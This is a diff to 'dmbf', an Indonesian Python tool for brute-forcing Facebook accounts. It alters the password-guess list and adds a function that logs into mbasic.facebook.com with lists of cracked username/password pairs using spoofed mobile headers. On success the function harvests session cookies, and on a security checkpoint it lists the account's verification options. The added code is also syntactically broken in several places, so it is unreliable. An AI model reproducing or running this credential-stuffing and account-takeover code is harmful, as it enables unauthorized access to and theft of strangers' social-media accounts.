@@ -56,8 +56,8 @@ _U_ = "\x1b[0;91m" # Ungu
 ### Logo
 _logo_line_1_ = ('%s ___  __  __ ___ ___ '%(_P_))
 _logo_line_2_ = ('%s|   \|  \/  | _ ) __| %s┌─────────────────────────┐'%(_P_,_U_))
-_logo_line_3_ = ('%s| |) | |\/| | _ \ _|  %s│   %s• Code By Dapunta •   %s│'%(_P_,_U_,_P_,_U_))
-_logo_line_4_ = ('%s|___/|_|  |_|___/_|   %s│ %sGithub.com/Dapunta/dmbf %s│'%(_P_,_U_,_P_,_U_))
+_logo_line_3_ = ('%s| |) | |\/| | _ \ _|  %s│   %s• Code By Dapunta •   %s  │'%(_P_,_U_,_P_,_U_))
+_logo_line_4_ = ('%s|___/|_|  |_|___/_|   %s│ %sGithub.com/BocilAlok/smbf %s│'%(_P_,_U_,_P_,_U_))
 _logo_line_5_ = ('%s XNSCODE Team 2021    └─────────────────────────┘'%(_U_))
 def _my_logo_():
     _dapunta_cici_(_logo_line_1_)
@@ -198,6 +198,7 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
     _dapunta_cici_('%s[%s3%s] %sCrack ID Dari Likers'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s4%s] %sLihat Hasil Crack'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s5%s] %sUser Agent'%(_U_,_P_,_U_,_P_))
+    _dapunta_cici_('%s[%s6%s] %sCek Opsi Akun Checkpoint'%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('%s[%s0%s] %sLog Out'%(_U_,_P_,_U_,_P_))
     _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
     _dapunta_cici_('')
@@ -215,6 +216,8 @@ def _menu_dev_(_Dapunta_Ganteng_Banget_):
         _cek_result_dev_()
     elif _dapunta_menu__cici_dapunta__ in ['5','05','e']:
         _ugen_dev_(_Dapunta_Ganteng_Banget_)
+    elif _dapunta_menu__cici_dapunta__ in ['6','06','f']:
+        _cek_opsi_akun_cp_()
     elif _dapunta_menu__cici_dapunta__ in ['0','00','z']:
         _dapunta_cici_('%s[%s•%s] %sSampai Jumpa %s%s %s!'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_,_P_))
         _bersih_()
@@ -332,14 +335,10 @@ def _pass_list_(_cici_):
             if len(_suci_salsabila_)==3 or len(_suci_salsabila_)==4 or len(_suci_salsabila_)==5:
                 _dapunta_.append(_suci_salsabila_+"123")
                 _dapunta_.append(_suci_salsabila_+"12345")
-                _dapunta_.append(_suci_salsabila_+"gaming")
-                _dapunta_.append (_suci_salsabila_+"ganteng")
             else:
                 _dapunta_.append(_suci_salsabila_)
                 _dapunta_.append(_suci_salsabila_+"123")
                 _dapunta_.append(_suci_salsabila_+"12345")
-                _dapunta_.append(_suci_salsabila_+"gaming")
-                _dapunta_.append (_suci_salsabila_+"ganteng")
     _dapunta_.append(_cici_.lower())
     _dapunta_.append("sayang")
     _dapunta_.append("bismillah")
@@ -776,6 +775,121 @@ def _var_ugen_(_Dapunta_Cinta_Cici_):
     _dapunta_cici_("%s[%s4%s] %sHapus User Agent"%(_U_,_P_,_U_,_P_))
     _dapunta_cici_("%s[%s5%s] %sCek User Agent"%(_U_,_P_,_U_,_P_))
     _dapunta_cici_("%s[%s0%s] %sKembali"%(_U_,_P_,_U_,_P_))
+  
+### Cek Opsi
+def _cek_opsi_akun_cp_():
+
+    _dapunta_cici_('%s[%s•%s] %sMasukan file Contoh : \033[0;00mCP/%s.txt\n'%(_U_,_P_,_U_,_P_))
+    file = raw_input('%s[%s•%s] %sNama File :\n'%(_U_,_P_,_U_,_P_))
+    if file == '':
+        _dapunta_cici_('%s[%s•%s] %sWronk Input\n'%(_U_,_P_,_U_,_P_))
+          _cici_cici_()
+    
+    try:
+        self = open(file, 'r').readlines()
+    except IOError:
+        _dapunta_cici_('%s[%s•%s] %sFile Tidak Ada :(\n'%(_U_,_P_,_U_,_P_))
+          _cici_cici_()
+
+    _dapunta_cici_('\n%s[%s•%s] %sTotal Akun %s Adalah %s Akun'%(len(self)))
+    for yes in self:
+        fl = yes.replace('\n', '')
+        ya = fl.split(' • ')
+        _dapunta_cici_('\n%s[%s•%s] %sProses...' + fl.replace(' + ', '')
+        
+        try:
+            check_in(ya[0].replace(' + ', ''), ya[1])
+   #     continue
+        except requests.exceptions.ConnectionError:
+            _dapunta_cici_('%s[%s•%s] %sKoneksi Jelek !!!\n'%(_U_,_P_,_U_,_P_))
+            _cici_cici_()
+            continue
+        
+
+    
+    _dapunta_cici_('%s[%s•%s] %sSelesai\n'%(_U_,_P_,_U_,_P_))
+    _cici_cici_()
+
+
+def check_in(user, pasw):
+    mb = 'https://mbasic.facebook.com'
+    ua = 'Mozilla/5.0 (Linux; Android 4.4.4; SC-01G Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36'
+    ses = requests.Session()
+    ses.headers.update({
+        'Host': 'mbasic.facebook.com',
+        'cache-control': 'max-age=0',
+        'upgrade-insecure-requests': '1',
+        'origin': mb,
+        'content-type': 'application/x-www-form-urlencoded',
+        'user-agent': ua,
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'x-requested-with': 'mark.via.gp',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-user': '?1',
+        'sec-fetch-dest': 'document',
+        'referer': mb + '/login/?next&ref=dbl&fl&refid=8',
+        'accept-encoding': 'gzip, deflate',
+        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
+    data = { }
+    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers = {
+        'user-agent': ua }).text, 'html.parser')
+    fm = ged.find('form', {
+        'method': 'post' })
+    list = [
+        'lsd',
+        'jazoest',
+        'm_ts',
+        'li',
+        'try_number',
+        'unrecognized_tries',
+        'login',
+        'bi_xrwh']
+    for i in fm.find_all('input'):
+        if i.get('name') in list:
+            data.update({
+                i.get('name'): i.get('value') })
+            continue
+            continue
+    data.update({
+        'email': user,
+        'pass': pasw })
+    run = parser(ses.post(mb + fm.get('action'), data = data, allow_redirects = True).text, 'html.parser')
+    if 'c_user' in ses.cookies:
+        kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
+        run = parser(ses.get('https://free.facebook.com/settings/apps/tabbed/', cookies = {
+            'cookie': kuki }).text, 'html.parser')
+        xe = [ re.findall('\\<span.*?href=".*?">(.*?)<\\/a><\\/span>.*?\\<div class=".*?">(.*?)<\\/div>', str(td)) for td in run.find_all('td', {
+            'aria-hidden': 'false' }) ][2:]
+        
+    elif 'checkpoint' in ses.cookies:
+        form = run.find('form')
+        dtsg = form.find('input', {
+            'name': 'fb_dtsg' })['value']
+        jzst = form.find('input', {
+            'name': 'jazoest' })['value']
+        nh = form.find('input', {
+            'name': 'nh' })['value']
+        dataD = {
+            'fb_dtsg': dtsg,
+            'fb_dtsg': dtsg,
+            'jazoest': jzst,
+            'jazoest': jzst,
+            'checkpoint_data': '',
+            'submit[Continue]': 'Lanjutkan',
+            'nh': nh }
+        parr = parser(ses.post(mb + form['action'], data = dataD).text, 'html.parser')
+        proo = [ yy.text for yy in parr.find_all('option') ]
+         _dapunta_cici_('%sTerdapat\n'%(_U_,_P_,_U_,_P_)) + str(len(proo)) + '%sOpsi\n'%(_U_,_P_,_U_,_P_))
+        for opt in range(len(proo)):
+            _dapunta_cici_('\n%s'(_U_,_P_,_U_,_P_)) + str(opt + 1) + '\n%s'(_U_,_P_,_U_,_P_))' + proo[opt]
+        
+    elif 'login_error' in str(run):
+        oh = run.find('div', {
+            'id': 'login_error' }).find('div').text
+        _dapunta_cici_('%s' % oh
+    else:
+        _dapunta_cici_('%s[%s•%s] %sLogin Gagal Periksa Username atau Password\n'%(_U_,_P_,_U_,_P_))
 
 ### Tampilan Metode
 def start_method():
